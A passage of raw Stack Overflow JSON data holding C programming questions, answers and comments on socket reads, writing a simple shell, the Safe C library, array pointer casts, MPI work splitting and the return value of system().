&amp;status, 0);</code> statement in my <code>parent</code> to wait for <code>child</code> to finish off its tasks, the compiler gets stuck in the first cold run at <code>while</code> loop when pipe is actually empty. How can I <code>AND</code> another condition in my <code>while</code> to let compiler simply ignore empty pipes?</p>\n"}, {"tags": ["c", "sockets"], "comments": [{"owner": {"reputation": 4857, "user_id": 1405614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e9a70943a5d825c32446259aa7e9348?s=128&d=identicon&r=PG", "display_name": "Valeri Atamaniouk", "link": "https://stackoverflow.com/users/1405614/valeri-atamaniouk"}, "edited": false, "score": 2, "creation_date": 1444820667, "post_id": 33123361, "comment_id": 54059777, "body": "No, <code>read()</code> would read whatever it has. It will block only in blocking mode, when there is no data and no other events pending."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5444681"}, "reply_to_user": {"reputation": 4857, "user_id": 1405614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e9a70943a5d825c32446259aa7e9348?s=128&d=identicon&r=PG", "display_name": "Valeri Atamaniouk", "link": "https://stackoverflow.com/users/1405614/valeri-atamaniouk"}, "edited": false, "score": 0, "creation_date": 1444821183, "post_id": 33123361, "comment_id": 54060079, "body": "Thanks. Then what could be the problem? Could it be that the 2nd message was send too fast?"}, {"owner": {"reputation": 4857, "user_id": 1405614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e9a70943a5d825c32446259aa7e9348?s=128&d=identicon&r=PG", "display_name": "Valeri Atamaniouk", "link": "https://stackoverflow.com/users/1405614/valeri-atamaniouk"}, "edited": false, "score": 0, "creation_date": 1444821323, "post_id": 33123361, "comment_id": 54060171, "body": "No. Even if it is sent before the client sent it&#39;s data, you would be able to read it, as it is the way stream sockets operate. It might be so, that the server has not received full request and thus doesn&#39;t send response. For example, in HTTP protocol, the server would not start replying until it reads all request headers + newline. So check that part."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5444681"}, "reply_to_user": {"reputation": 4857, "user_id": 1405614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e9a70943a5d825c32446259aa7e9348?s=128&d=identicon&r=PG", "display_name": "Valeri Atamaniouk", "link": "https://stackoverflow.com/users/1405614/valeri-atamaniouk"}, "edited": false, "score": 0, "creation_date": 1444821747, "post_id": 33123361, "comment_id": 54060428, "body": "So do I have to add a special char like \\n? I didn&#39;t."}, {"owner": {"reputation": 4857, "user_id": 1405614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e9a70943a5d825c32446259aa7e9348?s=128&d=identicon&r=PG", "display_name": "Valeri Atamaniouk", "link": "https://stackoverflow.com/users/1405614/valeri-atamaniouk"}, "edited": false, "score": 0, "creation_date": 1444822119, "post_id": 33123361, "comment_id": 54060678, "body": "If you use HTTP, the end of request is two &#39;\\n&#39; chars (to make one empty line). I don&#39;t recommend you to implement own HTTP stack. Use some existing library instead. HTTP protocol is a bit cumbersome and has a lot of nuances. Otherwise, read <a href=\"http://www.w3.org/Protocols/rfc2616/rfc2616.txt\" rel=\"nofollow noreferrer\">w3.org/Protocols/rfc2616/rfc2616.txt</a>"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5444681"}, "edited": false, "score": 0, "creation_date": 1444820442, "post_id": 33123434, "comment_id": 54059649, "body": "Ok it is a tcp socket, I forgot to mention. I did not set any socket options. So does the buffer has to be full that read() will continue? According to your answer: No. But why does this happen? Was the 2nd package send too fast?"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 1, "creation_date": 1444825139, "post_id": 33123434, "comment_id": 54062575, "body": "@Ctwx The socket API does not deal with packets when you&#39;re using TCP. If you want to send your own messages over TCP, you need a way to know where one such message begins and where it ends. your read() call could read 4 of your messages or it could read 1/3 of a message - which you&#39;ll need to deal with."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1444820005, "creation_date": 1444820005, "answer_id": 33123434, "question_id": 33123361, "link": "https://stackoverflow.com/questions/33123361/will-read-socket-block-until-the-buffer-is-full/33123434#33123434", "title": "Will read (socket) block until the buffer is full?", "body": "<p>It depends. For TCP sockets <code>read</code> may return before the buffer is full, and you may need to receive in a loop to get a whole message. For UDP sockets the size you read is typically the size of a single packet (datagram) and then <code>read</code> may block until it has read all the requested data.</p>\n"}, {"tags": [], "owner": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "is_accepted": false, "score": 1, "last_activity_date": 1597418135, "last_edit_date": 1597418135, "creation_date": 1444821392, "answer_id": 33123867, "question_id": 33123361, "link": "https://stackoverflow.com/questions/33123361/will-read-socket-block-until-the-buffer-is-full/33123867#33123867", "title": "Will read (socket) block until the buffer is full?", "body": "<p>The answer is no:  <code>read()</code> on a tcp/ip socket will not block until the buffer has the amount of data you requested.   <code>read()</code> will return immediately in all cases if any data is available, even if your socket is blocking and you've requested more data than is available.</p>\n<p>Keep in mind that TCP/IP is a byte stream protocol and you must treat it as such.   The interface is under no obligation to transmit your data together in a single packet, as long as it is presented to you in the order you placed it in the socket.</p>\n"}, {"tags": [], "owner": {"reputation": 1129, "user_id": 2477715, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4415aba5097f29d290ed845bb4dd31b?s=128&d=identicon&r=PG", "display_name": "Sohil Omer", "link": "https://stackoverflow.com/users/2477715/sohil-omer"}, "is_accepted": true, "score": -4, "last_activity_date": 1444822625, "last_edit_date": 1444822625, "creation_date": 1444821882, "answer_id": 33124049, "question_id": 33123361, "link": "https://stackoverflow.com/questions/33123361/will-read-socket-block-until-the-buffer-is-full/33124049#33124049", "title": "Will read (socket) block until the buffer is full?", "body": "<p>The answer is no , read is not blocking call , You can refer below points to guess the error</p>\n\n<p>Several Checkpoints you can find :</p>\n\n<ol>\n<li>Find out what read is returning at the second time .</li>\n<li>memset the buffer every time in while before recv</li>\n<li>use fflush(stdout) if not able to output.</li>\n</ol>\n\n<p>Make sure all three are present . if problem not solved yet .please post source code here </p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5444681"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1429, "favorite_count": 0, "accepted_answer_id": 33124049, "answer_count": 3, "score": 2, "last_activity_date": 1597418135, "creation_date": 1444819774, "question_id": 33123361, "link": "https://stackoverflow.com/questions/33123361/will-read-socket-block-until-the-buffer-is-full", "title": "Will read (socket) block until the buffer is full?", "body": "<p>I wrote a simple C socket program that sends an INIT package to the server to indicate to prepare a text transfer. The server does not sends any data back at that time.\nAfter sending the INIT package the client sends a GET package and waits for chunks of data from the server.\nSo every time the server receives a GET package it will send a chunk of data to the client.</p>\n\n<p>So far so good. The buffer has a size of 512 bytes, a chunk is 100 Bytes plus a little overhead big.</p>\n\n<p>But my problem is that the client does not receive the second message.</p>\n\n<p>So my guess is that read() will blpck until the buffer is full. Is that right or what might be the reason for that?</p>\n"}, {"tags": ["c", "bash", "shell", "execv"], "comments": [{"owner": {"reputation": 1897, "user_id": 5438072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4be573719c55abed16d969fdaf292e2b?s=128&d=identicon&r=PG&f=1", "display_name": "Roman Pustylnikov", "link": "https://stackoverflow.com/users/5438072/roman-pustylnikov"}, "edited": false, "score": 2, "creation_date": 1444821176, "post_id": 33123242, "comment_id": 54060073, "body": "What do you need that array for? What is the question?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4832408"}, "edited": false, "score": 0, "creation_date": 1444824980, "post_id": 33123242, "comment_id": 54062457, "body": "no, you don&#39;t need to declare the variables as const, all of the exec() family casts const on their own. just concentrate on getting a char **[] populated with the sets of commands you needs from in between delimiters and then pass char *[]&#39;s into execvp(). in a loop."}], "answers": [{"comments": [{"owner": {"reputation": 672, "user_id": 5143819, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/b488584cf234a38258d6bc568f8c4fde?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/5143819/jack"}, "edited": false, "score": 0, "creation_date": 1444822041, "post_id": 33124048, "comment_id": 54060637, "body": "thank you for your response, this answers my first question. my other worry, is that I have an example input, ex: mkdir new_folder, i split that, in &quot;mkdir&quot; and &quot;new_folder&quot; and store them in an array, then parse that array?"}, {"owner": {"reputation": 86, "user_id": 3032524, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3309381c5d19320dca27ab0036aa3420?s=128&d=identicon&r=PG&f=1", "display_name": "user3032524", "link": "https://stackoverflow.com/users/3032524/user3032524"}, "reply_to_user": {"reputation": 672, "user_id": 5143819, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/b488584cf234a38258d6bc568f8c4fde?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/5143819/jack"}, "edited": false, "score": 0, "creation_date": 1444822408, "post_id": 33124048, "comment_id": 54060854, "body": "Yes, your idea seem right to me. Your input may be either just mkdir folder, either mkdir folder1 folder2 or ls folder | grep regexp &amp;&amp; mkdir folder and so on. It can become quite complex. The solution depends on what capabilities should your shell implement. You will parse the string and split the commands by | or &amp;&amp; or other delimiters and those command will then contain  the name of the command and a list of the arguments, splitted by white character or just space."}], "tags": [], "owner": {"reputation": 86, "user_id": 3032524, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3309381c5d19320dca27ab0036aa3420?s=128&d=identicon&r=PG&f=1", "display_name": "user3032524", "link": "https://stackoverflow.com/users/3032524/user3032524"}, "is_accepted": true, "score": 1, "last_activity_date": 1444821880, "creation_date": 1444821880, "answer_id": 33124048, "question_id": 33123242, "link": "https://stackoverflow.com/questions/33123242/making-my-own-shell/33124048#33124048", "title": "Making my own shell", "body": "<p>why do you want to use execv? The <strong>execl</strong> does the same thing and expects a const char* array of arguments.</p>\n\n<p><code>int execl(const char *path, const char *arg, ...);</code></p>\n\n<p>Otherwise you are right, you can not assign the address to the char* const in runtime. That is why the <strong>execl</strong> is here - it is a convenient function for this purpose.</p>\n"}], "owner": {"reputation": 672, "user_id": 5143819, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/b488584cf234a38258d6bc568f8c4fde?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/5143819/jack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 0, "accepted_answer_id": 33124048, "answer_count": 1, "score": 0, "last_activity_date": 1444821880, "creation_date": 1444819464, "last_edit_date": 1444819629, "question_id": 33123242, "link": "https://stackoverflow.com/questions/33123242/making-my-own-shell", "title": "Making my own shell", "body": "<p>This is homework, as you can tell. Which will be implemented in C.</p>\n\n<p>First of all I created some functions that print the shell \ne.x.</p>\n\n<pre><code>printf(\"%s@cs345sh:~/%s \", getlogin(), get_working_directory());\n</code></pre>\n\n<p>After that, I proceed with tokenizing the input line with '|' as a delimiter so I get the commands that will be piped later on. </p>\n\n<pre><code>char* instr;\ninstr = strtok(line, \"|\");\nwhile (instr != NULL) {\n    insert_arguments_list(instr); //This is a singly-linked list that holds the arguments.\n    instr = strtok(NULL, \"|\");\n}\n</code></pre>\n\n<p>So now, I have to create a char *const array which is one of the things that I <strong>don't</strong> know how to do since all the variables have to be declared beforehand since it's const, no??</p>\n\n<p>Can you provide some tips on how to proceed from now on? </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 1, "creation_date": 1444822769, "post_id": 33122434, "comment_id": 54061080, "body": "Why? Considering that it was Microsoft who originally proposed the &quot;safe&quot; interface, why would you want to use an alternate implementation? As you  noticed in 1. the functions are already available with the compiler."}, {"owner": {"reputation": 1, "user_id": 5444519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b26fbf685ccb7d2c1647b290cd095000?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar Nazeer", "link": "https://stackoverflow.com/users/5444519/mazhar-nazeer"}, "reply_to_user": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1444823411, "post_id": 33122434, "comment_id": 54061445, "body": "@BoPersson, Actually there are some functions which are not present in Microsoft version of safe library. For example, Strlen does not have safe version as it has in sourceforge version."}, {"owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1444823696, "post_id": 33122434, "comment_id": 54061624, "body": "Ok, so it might be called <a href=\"https://msdn.microsoft.com/en-us/library/z50ty2zh(v=vs.90).aspx\" rel=\"nofollow noreferrer\"><code>strnlen_s</code></a>, but it is available."}, {"owner": {"reputation": 1, "user_id": 5444519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b26fbf685ccb7d2c1647b290cd095000?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar Nazeer", "link": "https://stackoverflow.com/users/5444519/mazhar-nazeer"}, "reply_to_user": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1444826242, "post_id": 33122434, "comment_id": 54063357, "body": "There are many others. Following is the list.  - Strlen. - strchr - strcmp - strrchr - memset - strcasecmp - strncasecmp - memcmp"}, {"owner": {"reputation": 1, "user_id": 5444519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b26fbf685ccb7d2c1647b290cd095000?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar Nazeer", "link": "https://stackoverflow.com/users/5444519/mazhar-nazeer"}, "reply_to_user": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1444893402, "post_id": 33122434, "comment_id": 54094429, "body": "@BoPersson, Can you help finding secure functions for the list I provided in previous comment?"}], "owner": {"reputation": 1, "user_id": 5444519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b26fbf685ccb7d2c1647b290cd095000?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar Nazeer", "link": "https://stackoverflow.com/users/5444519/mazhar-nazeer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 74, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1444817168, "creation_date": 1444817168, "question_id": 33122434, "link": "https://stackoverflow.com/questions/33122434/using-sourceforge-safe-c-library-in-visual-studio", "title": "Using Sourceforge Safe C Library in Visual Studio", "body": "<p>I am trying to use Safe C library available free at sourceforge website.</p>\n\n<p><a href=\"https://sourceforge.net/projects/safeclib/\" rel=\"nofollow\">https://sourceforge.net/projects/safeclib/</a></p>\n\n<p>I compiled this library as .a static library using MingW and trying to use it in Visual Studio 2008.</p>\n\n<p>I am facing following issues:</p>\n\n<ol>\n<li><p>Safe C library has same function names as defined in Visual Studio. For example strcpy_s, it is giving me redefinition error.</p></li>\n<li><p>I don't know the consequences using .a library which is not compiled in MS environment but using in Visual Studio. Will there be any issues?</p></li>\n<li><p>Is there any sample or example using this library in Visual Studio environment?</p></li>\n</ol>\n\n<p>Please answer me as soon as possible.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 3, "creation_date": 1444819899, "post_id": 33122315, "comment_id": 54059316, "body": "Let me just add that: <code>void print(twoInts *twoIntsPtr);</code> is identical to:  <code>void print(int (*twoIntsPtr)[2]);</code> Or in other words, don&#39;t hide arrays and pointers behind typedefs."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1444821582, "post_id": 33122315, "comment_id": 54060314, "body": "The best and proper solution to the problem, is indeed to never hide an array behind a typedef. Then you could use plain <code>int*</code>pointers without the need to obfuscate the program to oblivion."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444835687, "post_id": 33122315, "comment_id": 54070271, "body": "I&#39;d say  <code>print((twoInts *)&amp;b);</code> should do."}], "answers": [{"tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 3, "last_activity_date": 1444817681, "creation_date": 1444817681, "answer_id": 33122641, "question_id": 33122315, "link": "https://stackoverflow.com/questions/33122315/casting-pointer-to-pointer-to-an-array/33122641#33122641", "title": "casting pointer to pointer to an array", "body": "<p><code>a</code> is an array. So when you pass it to <code>intermediate()</code>, it gets converted into a pointer to its first element (aka \"array decaying\").</p>\n\n<p>So, the <code>b</code> in:</p>\n\n<pre><code>void intermediate(twoInts b) {\n    print(&amp;b);\n}\n</code></pre>\n\n<p>has type <code>int*</code>, not <code>int[2]</code> as you might seem to expect. Hence, <code>&amp;b</code> is of type <code>int**</code> rather than <code>int (*)[2]</code> that's expected by <code>print()</code> function.\nHence, the types don't match.</p>\n\n<p>If you change <code>intermediate()</code> to:</p>\n\n<pre><code>void intermediate(twoInts *b) {\n    print(b);\n}\n</code></pre>\n\n<p>then you wouldn't need to pass the address of the <code>&amp;b</code> and it will as expected and the types would match correctly.</p>\n"}], "owner": {"reputation": 1600, "user_id": 2335246, "user_type": "registered", "accept_rate": 21, "profile_image": "https://www.gravatar.com/avatar/23f5a1946110781f69cd99570d4a1d7b?s=128&d=identicon&r=PG", "display_name": "GeekyJ", "link": "https://stackoverflow.com/users/2335246/geekyj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1031, "favorite_count": 0, "answer_count": 1, "score": 5, "last_activity_date": 1444819635, "creation_date": 1444816856, "last_edit_date": 1444819635, "question_id": 33122315, "link": "https://stackoverflow.com/questions/33122315/casting-pointer-to-pointer-to-an-array", "title": "casting pointer to pointer to an array", "body": "<p>Below is the code snippet. I want to know if <code>line no. 17</code> typecasting is valid and proper in c?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef int twoInts[2];\n\nvoid print(twoInts *twoIntsPtr);\nvoid intermediate (twoInts twoIntsAppearsByValue);\n\nint main () {\n    twoInts a;\n    a[0] = 0;\n    a[1] = 1;\n    print(&amp;a);\n    intermediate(a);\n    return 0;\n}\nvoid intermediate(twoInts b) {\n    print((int(*)[])b); // &lt;&lt;&lt; line no. 17 &lt;&lt;&lt;\n}\n\nvoid print(twoInts *c){\n    printf(\"%d\\n%d\\n\", (*c)[0], (*c)[1]);\n}\n</code></pre>\n\n<p>Also, when i change the definition <code>intermediate</code> to</p>\n\n<pre><code>void intermediate(twoInts b) {\n    print(&amp;b);\n}\n</code></pre>\n\n<p>I am getting below warnings while compiling and o/p is not proper.</p>\n\n<pre><code>1.c:17:11: warning: passing argument 1 of print from incompatible pointer type\n     print(&amp;b);\n           ^\n1.c:5:6: note: expected int (*)[2] but argument is of type int **\n void print(twoInts *twoIntsPtr);\n</code></pre>\n\n<p>As per my understanding, array is decaying to <code>pointer to int</code> in funtion argument. What is the exact reason?</p>\n"}, {"tags": ["c", "parallel-processing", "mpi", "cluster-computing", "heterogeneous"], "comments": [{"owner": {"reputation": 1148, "user_id": 5383521, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/01531ac40d262787ab7659f7220505df?s=128&d=identicon&r=PG&f=1", "display_name": "flowit", "link": "https://stackoverflow.com/users/5383521/flowit"}, "edited": false, "score": 0, "creation_date": 1444817391, "post_id": 33122250, "comment_id": 54057666, "body": "The last time I worked with MPI is years age so I can&#39;t provide you with an example, but one possible way of distributing workloads could be: Suppose you have 2n-1 nodes. Then you create your data chunks and send two chunks to every slave and only one chunk to the master. In this example, n is the number of &#39;real&#39; nodes you want to use, including the master."}, {"owner": {"reputation": 65854, "user_id": 1374437, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/34xta.png?s=128&g=1", "display_name": "Hristo &#39;away&#39; Iliev", "link": "https://stackoverflow.com/users/1374437/hristo-away-iliev"}, "edited": false, "score": 3, "creation_date": 1444825482, "post_id": 33122250, "comment_id": 54062799, "body": "Use the code from Jonathan Dursi, just adjust the computation of the initial file position accordingly. It is a simple mathematical problem, i.e. divide the work into <code>(2*nprocs+1)</code> chunks, have the master rank take one chunk and all the other ranks take two chunks."}], "owner": {"reputation": 53, "user_id": 4910742, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3782a7d398467b8d5db90949a68a7dd2?s=128&d=identicon&r=PG&f=1", "display_name": "Mitali Srivastava", "link": "https://stackoverflow.com/users/4910742/mitali-srivastava"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 97, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1444816676, "creation_date": 1444816676, "last_edit_date": 1495542578, "question_id": 33122250, "link": "https://stackoverflow.com/questions/33122250/how-to-distribute-unequal-number-of-lines-from-a-file-among-various-processors-i", "title": "how to distribute unequal number of lines from a file among various processors in MPI on heterogeneous cluster?", "body": "<p>I have a text file having n number of rows. i want to divide these rows among processors in 1:2 ratio means master node take only half of the lines than other processors. I followed code for equal distribution of lines from the link <a href=\"https://stackoverflow.com/questions/12939279/mpi-reading-from-a-text-file\">MPI Reading from a text file</a>. here we are dividing file equally among processors.Since this code is effective when all processor's speeds are same. but in my case master node is taking more time compare to other processors. so i want give less number of lines to master node compare to others to speed up the code. can any one provide the logic or source code for unequal distribution ?</p>\n"}, {"tags": ["c", "linux", "unix", "system"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1444815426, "post_id": 33121631, "comment_id": 54056376, "body": "You probably want to use <a href=\"http://man7.org/linux/man-pages/man2/wait.2.html\" rel=\"nofollow noreferrer\"><code>WEXITSTATUS</code></a> on that value (subject to appropriate conditions)."}, {"owner": {"reputation": 6463, "user_id": 5063789, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/57dfee355833ddc59127fc6a0584b908?s=128&d=identicon&r=PG&f=1", "display_name": "mohangraj", "link": "https://stackoverflow.com/users/5063789/mohangraj"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1444815766, "post_id": 33121631, "comment_id": 54056605, "body": "So, Here how can I get the real exit status of command which is passed to system function."}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1444815903, "post_id": 33121631, "comment_id": 54056697, "body": "Read the linked document starting at &quot;If status is not NULL,&quot; about half-way down."}], "answers": [{"tags": [], "owner": {"reputation": 695058, "user_id": 20862, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2343ae368d3241278581ce6c87f62a25?s=128&d=identicon&r=PG", "display_name": "Ignacio Vazquez-Abrams", "link": "https://stackoverflow.com/users/20862/ignacio-vazquez-abrams"}, "is_accepted": true, "score": 4, "last_activity_date": 1444815419, "creation_date": 1444815419, "answer_id": 33121745, "question_id": 33121631, "link": "https://stackoverflow.com/questions/33121631/return-value-of-system-function/33121745#33121745", "title": "Return value of System Function", "body": "<p>You forgot to read the whole section.</p>\n\n<blockquote>\n  <p>[T]he return value is a \"wait status\" that can  be\n         examined  using the macros described in <code>waitpid(2)</code>.  (i.e., <code>WIFEXITED()</code>\n         <code>WEXITSTATUS()</code> and so on).</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "is_accepted": false, "score": 0, "last_activity_date": 1444884680, "creation_date": 1444884680, "answer_id": 33140113, "question_id": 33121631, "link": "https://stackoverflow.com/questions/33121631/return-value-of-system-function/33140113#33140113", "title": "Return value of System Function", "body": "<p>The return value is the exit status of the shell, see <code>sh(1)</code>, <code>bash(1)</code> or whatever you have configured in <code>SHELL</code> environment variable.  By the way, the shell usually returns the last command executed exit value, but that can not be the case if you have hit the <code>Ctrl-C</code> key or sent a signal to the process.  Check in the manual page for the exit value of the shell on these cases.</p>\n"}], "owner": {"reputation": 6463, "user_id": 5063789, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/57dfee355833ddc59127fc6a0584b908?s=128&d=identicon&r=PG&f=1", "display_name": "mohangraj", "link": "https://stackoverflow.com/users/5063789/mohangraj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2806, "favorite_count": 0, "closed_date": 1502047977, "accepted_answer_id": 33121745, "answer_count": 2, "score": 1, "last_activity_date": 1444884680, "creation_date": 1444815132, "question_id": 33121631, "link": "https://stackoverflow.com/questions/33121631/return-value-of-system-function", "closed_reason": "Duplicate", "title": "Return value of System Function", "body": "<p>I Experimented the system function call. It is used to execute the command with in the program. The man page contains the following information about the return value of system.</p>\n\n<p>RETURN VALUE</p>\n\n<pre><code>The value returned is -1 on error (e.g.  fork(2) failed), and the return status of the command otherwise.\n</code></pre>\n\n<p>As per the man page reference, I checked the following program. </p>\n\n<p>Program:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;unistd.h&gt;\nint main()\n{   \n    printf(\"System returns: %d\\n\",system(\"ls a\"));\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$ ./a.out \nls: cannot access a: No such file or directory\nSystem returns: 512\n$ ls a\nls: cannot access a: No such file or directory\nmohanraj@ltsp63:~/Advanced_Unix/Chapter8/check$ echo $?\n2\n$ \n</code></pre>\n\n<p>The above output shows that, return value of system function is 512 and the exit status of <code>ls a</code> command is 2. As per the \nreference, I expect the return value of system function is equal to exit status of the ls command. But the value becomes different. \nWhy?</p>\n"}, {"tags": ["c", "file", "printing", "fputs"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 2, "creation_date": 1444815481, "post_id": 33121509, "comment_id": 54056412, "body": "try change <code>&quot;wb&quot;</code> to <code>&quot;w&quot;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1444815775, "post_id": 33121818, "comment_id": 54056614, "body": "&quot;wt&quot; is a non-standard mode for an <code>fopen()</code> call.  See 7.19.5.3:  <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf\" rel=\"nofollow noreferrer\">open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf</a>"}], "tags": [], "owner": {"reputation": 3045, "user_id": 956880, "user_type": "registered", 